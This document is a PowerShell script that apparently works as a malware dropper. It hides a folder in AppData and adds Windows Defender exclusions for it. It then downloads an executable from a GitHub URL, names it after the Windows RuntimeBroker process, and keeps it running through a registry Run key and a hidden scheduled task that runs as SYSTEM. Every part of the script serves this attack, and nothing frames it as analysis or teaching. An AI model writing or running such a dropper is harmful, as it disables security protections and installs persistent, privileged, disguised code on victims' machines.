#Requires -Version 5.1
$ErrorActionPreference = 'SilentlyContinue'

# 1. Create hidden folder in AppData
$hiddenDir = "$env:APPDATA\Apdata"
if (-not (Test-Path $hiddenDir)) {
    New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
    (Get-Item $hiddenDir).Attributes = 'Hidden'
    Write-Host "Created hidden directory: $hiddenDir"
}

# 2. Add exclusions to Windows Defender
try {
    $subDir = 'C:\Windows\System32\config\systemprofile\AppData\Roaming\SubDir'
    Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop
    Add-MpPreference -ExclusionPath $subDir -ErrorAction Stop
    Write-Host "Added Windows Defender exclusions"
} catch {
    Write-Warning "Failed to add Windows Defender exclusions: $($_.Exception.Message)"
}

# 3. Download and execute file
$url = 'https://github.com/salamprajjit-alt/5132525231/raw/main/Runtime%20Broker.exe'
$output = "$hiddenDir\RuntimeBroker.exe"

try {
    # Download the file
    Write-Host "Downloading file..."
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction Stop
    Write-Host "File downloaded successfully"
    
    # Verify the file was downloaded
    if (Test-Path $output) {
        # Set startup persistence via registry
        $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $regPath -Name 'RuntimeBroker' -Value "`"$output`"" -Force -ErrorAction Stop
        Write-Host "Added to startup registry"
        
        # Create a scheduled task to run as admin
        $taskName = "SystemRuntimeBroker"
        $action = New-ScheduledTaskAction -Execute $output
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        
        Register-ScheduledTask -TaskName $taskName -InputObject $task -Force -ErrorAction Stop
        Write-Host "Created scheduled task for admin execution"
        
        # Execute the file with admin privileges using scheduled task
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Write-Host "Started application with admin privileges"
        
        # Also execute directly (will prompt for admin if needed)
        Start-Process -FilePath $output -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue
    } else {
        Write-Warning "Downloaded file not found at: $output"
    }
    
    Write-Host "Operation completed successfully." -ForegroundColor Green
} catch {
    Write-Warning "An error occurred: $($_.Exception.Message)"
    Write-Warning "Error details: $($_.Exception.StackTrace)"
}